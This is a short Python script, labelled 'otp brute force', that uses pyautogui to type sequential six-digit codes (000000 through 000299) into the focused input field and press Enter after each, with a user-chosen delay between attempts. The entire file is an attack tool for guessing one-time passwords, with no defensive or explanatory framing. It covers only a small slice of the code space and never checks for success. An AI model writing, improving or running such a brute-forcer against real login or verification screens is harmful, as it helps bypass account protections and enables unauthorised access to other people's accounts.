#! /python otp brute force 
import time
import pyautogui as do

delay = int(input("Enter Time Delay "))

time.sleep(5)

for i in range(300):
    time.sleep(delay)
    do.write(str(i).zfill(6))
    do.press("Enter")






